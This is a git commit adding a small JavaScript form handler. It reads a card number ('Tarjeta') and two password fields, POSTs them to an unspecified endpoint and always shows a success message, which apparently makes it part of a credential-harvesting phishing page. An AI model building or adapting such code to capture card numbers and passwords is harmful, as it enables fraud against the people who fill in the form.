84100e5d3a5f943972421d5c9a53b8470f173d33
soporte-rc <bluesmeralda4@gmail.com>
2024-11-15 09:02:11 -0600

    add files

---
+++ js/197app.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Tarjeta": formulario.usuario.value,
+            "Contrasena1": formulario.contraseña.value,
+            "Contrasena2": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
